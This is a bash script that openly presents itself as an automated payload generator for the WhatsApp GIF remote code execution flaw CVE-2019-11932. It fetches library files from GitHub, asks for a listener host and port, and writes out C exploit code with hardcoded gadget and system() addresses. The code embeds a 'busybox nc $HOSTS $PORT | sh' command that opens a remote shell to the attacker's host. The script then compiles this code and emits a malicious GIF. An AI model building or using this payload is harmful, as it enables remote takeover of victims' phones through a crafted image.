#!/bin/bash
if [[ $(ls | grep "gif_lib.h") == "" ]]; then
curl -s https://raw.githubusercontent.com/dorkerdevil/CVE-2019-11932/master/gif_lib.h -o gif_lib.h
fi
if [[ $(ls | grep "egif_lib.c") == "" ]]; then
curl -s https://raw.githubusercontent.com/dorkerdevil/CVE-2019-11932/master/egif_lib.c -o egif_lib.c
fi
dir=$(pwd)
main() {
clear
printf " 
 +---------------------------+
(         WhatsApp RCE        )       \|/
(      Automated Payload      ) [CVE-2019-11932]
(          Generator          )        -
 +---------------------------+
 
[!] Upgrade WhatsApp to Version 2.19.244 (Patched)
[!] Older WhatsApp Version Vuln To Exploited
[!] Easily To Exploit Android 8.1 or Higher\n\n"
printf "################### Starting ###################\n"
read -p "[>] Your Hosts as Listener     : " HOSTS
read -p "[>] Port                       : " PORT
read -p "[>] Output Name (without .gif) : " OUTNAME
echo "";
cat << CEXPLOIT > exploit.c
#include <stdio.h>
#include <string.h>
#include "gif_lib.h"

#define ONE_BYTE_HEX_STRING_SIZE   3
static inline void
get_hex(char *buf, int buf_len, char* hex_, int hex_len, int num_col) {
    int i;
    unsigned int byte_no = 0;
    if (buf_len <= 0) {
        if (hex_len > 0) {
            hex_[0] = '\0';
        }
        return;
    }
    if(hex_len < ONE_BYTE_HEX_STRING_SIZE + 1)
        return;
    do {
        for (i = 0; ((i < num_col) && (buf_len > 0) && (hex_len > 0)); ++i ) {
            snprintf(hex_, hex_len, "%02X ", buf[byte_no++] & 0xff);
            hex_ += ONE_BYTE_HEX_STRING_SIZE;
            hex_len -=ONE_BYTE_HEX_STRING_SIZE;
            buf_len--;
        }
        if (buf_len > 1) {
            snprintf(hex_, hex_len, "\n");
            hex_ += 1;
        }
    } while ((buf_len) > 0 && (hex_len > 0));
}

int genLine_0(unsigned char *buffer) {
/*
    00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
    00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
    00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
    00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..

    Over-write AAAAAAAA with address of gadget 1
    Over-write BBBBBBBB with address of system() function

    Gadget 1
    ldr x8, [x19, #0x18]
    add x0, x19, #0x20
    blr x8
*/
    unsigned char hexData[138] = {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xEF, 0xBE, 0xAD, 0xDE, 0xEE, 0xFF
    };
    memcpy(buffer, hexData, sizeof(hexData));

    /*
    Gadget g1:
        ldr x8, [x19, #0x18]
        add x0, x19, #0x20
        blr x8
    */
    size_t g1_loc = 0x7cb81f0954;
    memcpy(buffer + 128, &g1_loc, 8);

    size_t system_loc = 0x7cb602ce84;
    memcpy(buffer + 24, &system_loc, 8);

    char *command = "busybox nc $HOSTS $PORT | sh";
    memcpy(buffer + 32, command, strlen(command));

    return sizeof(hexData);
};

int main(int argc, char *argv[]) {
    GifFilePrivateType Private = {
            .Buf[0] = 0,
            .BitsPerPixel = 8,
            .ClearCode = 256,
            .EOFCode = 257,
            .RunningCode = 258,
            .RunningBits = 9,
            .MaxCode1 = 512,
            .CrntCode = FIRST_CODE,
            .CrntShiftState = 0,
            .CrntShiftDWord = 0,
            .PixelCount = 112,
            .OutBuf = { 0 },
            .OutBufLen = 0
    };
    int size = 0;
    unsigned char buffer[1000] = { 0 };

    unsigned char line[500] = { 0 };
    int line_size = genLine_0(line);
    EGifCompressLine(&Private, line, line_size);

    unsigned char starting[48] = {
            0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x18, 0x00, 0x0A, 0x00, 0xF2, 0x00, 0x00, 0x66, 0xCC, 0xCC,
            0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x33, 0x99, 0x66, 0x99, 0xFF, 0xCC, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x15, 0x00, 0x00, 0x08
    };
    unsigned char padding[2] = { 0xFF, 0xFF };
    unsigned char ending[61] = {
            0x2C, 0x00, 0x00, 0x00, 0x00, 0x1C, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
            0x1C, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00,
            0x00, 0x00, 0x00, 0x18, 0x00, 0x0A, 0x00, 0x0F, 0x00, 0x01, 0x00, 0x00, 0x3B
    };

    // starting bytes
    memcpy(buffer + size, starting, sizeof(starting));
    size += sizeof(starting);

    // size of encoded line + padding
    int tmp = Private.OutBufLen + sizeof(padding);
    buffer[size++] = tmp;

    // encoded-line bytes
    memcpy(buffer + size, Private.OutBuf, Private.OutBufLen);
    size += Private.OutBufLen;

    // padding bytes of 0xFFs to trigger info->rewind(info);
    memcpy(buffer + size, padding, sizeof(padding));
    size += sizeof(padding);

    // ending bytes
    memcpy(buffer + size, ending, sizeof(ending));
    size += sizeof(ending);

    char hex_dump[5000];
    get_hex(buffer, size, hex_dump, 5000, 16);
    printf("buffer = %p size = %d\n%s\n", buffer, size, hex_dump);
}
CEXPLOIT
}
main
printf "[!] Compiling...\n"
$(gcc -o generate egif_lib.c exploit.c)
sleep 2
wait
printf "[!] Generating Payload\n"
$(./generate | tail -n +2 | xxd -r -p > $OUTNAME.gif)
sleep 2
wait
printf "[!] Success Generating Payload at $dir/$OUTNAME.gif\n"
printf "[!] Thanks to awakened1712 | IndoXploit | ScreetSec\n"
